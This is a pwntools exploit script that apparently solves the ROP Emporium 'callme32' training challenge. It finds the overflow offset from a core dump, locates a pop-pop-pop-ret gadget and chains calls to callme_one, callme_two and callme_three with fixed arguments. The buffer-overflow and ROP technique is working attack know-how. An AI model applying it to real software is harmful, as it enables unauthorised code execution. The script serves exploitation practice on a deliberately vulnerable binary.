from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge3/x32/callme32'
bin= ELF(bin)
context.binary = bin
context.log_level = 'debug'

p= process(bin.path)
p.sendline(cyclic(400))
p.wait_for_close()
core= p.corefile

leak= core.eip  
offset= cyclic_find(leak)   # 64 bit n=8
print(f"Found offset {offset}")

call1= bin.plt['callme_one']
call2= bin.plt['callme_two']
call3= bin.plt['callme_three']
main= bin.symbols['exit']
pop3= next(bin.search(asm('pop esi; pop edi; pop ebp; ret;')))

arg1= 0xdeadbeef
arg2= 0xcafebabe
arg3= 0xd00df00d

chain= flat(b'A'* offset, 
            p32(call1), p32(pop3), p32(arg1), p32(arg2), p32(arg3),
            p32(call2), p32(pop3) , p32(arg1), p32(arg2), p32(arg3), 
            p32(call3), p32(main),p32(arg1), p32(arg2), p32(arg3))

p2= process(bin.path)           #bin.path because ELF object is not suitable for process()
p2.sendline(chain)
p2.interactive()

